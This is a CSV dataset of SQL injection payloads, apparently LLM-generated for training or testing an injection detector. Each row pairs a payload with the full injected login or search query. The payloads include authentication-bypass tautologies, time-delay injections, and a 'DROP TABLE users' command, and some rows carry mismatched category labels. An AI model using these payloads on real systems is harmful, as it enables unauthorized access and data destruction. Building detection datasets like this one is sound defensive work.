attack_category,template_context,payload,full_query,label,source,generator_model,round
tautology,login,1); WAITFOR DELAY '0:0:5' --,SELECT * FROM users WHERE username = '1); WAITFOR DELAY '0:0:5' --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,login,"1'; DECLARE @x INT; SET @x = DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5); IF @x IS NOT NULL EXECUTE(@x); --","SELECT * FROM users WHERE username = '1'; DECLARE @x INT; SET @x = DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5); IF @x IS NOT NULL EXECUTE(@x); --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,login,"1'; WITH T AS (SELECT COUNT(*) FROM users WHERE 1=0) SELECT username, password FROM users WHERE username = 'admin' AND password = 'admin'","SELECT * FROM users WHERE username = '1'; WITH T AS (SELECT COUNT(*) FROM users WHERE 1=0) SELECT username, password FROM users WHERE username = 'admin' AND password = 'admin'' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,login,--' OR 1=1/**/,SELECT * FROM users WHERE username = '--' OR 1=1/**/' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,login,' OR (SELECT 1 FROM DUAL)/*,SELECT * FROM users WHERE username = '' OR (SELECT 1 FROM DUAL)/*' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,login,' OR (1+1=2),SELECT * FROM users WHERE username = '' OR (1+1=2)' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,login,' OR (LENGTH(username)=1),SELECT * FROM users WHERE username = '' OR (LENGTH(username)=1)' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,login,1' /* */OR EXISTS(SELECT * FROM users WHERE username='admin'),SELECT * FROM users WHERE username = '1' /* */OR EXISTS(SELECT * FROM users WHERE username='admin')' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,login,"1' "" OR 1=1#","SELECT * FROM users WHERE username = '1' "" OR 1=1#' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,login,1' OR LENGTH(password)=0,SELECT * FROM users WHERE username = '1' OR LENGTH(password)=0' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,search,' OR 1=1#,SELECT * FROM products WHERE name LIKE '%' OR 1=1#%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,search,% AND '1'='1,SELECT * FROM products WHERE name LIKE '%% AND '1'='1%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,search,'; DROP TABLE users;,SELECT * FROM products WHERE name LIKE '%'; DROP TABLE users;%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
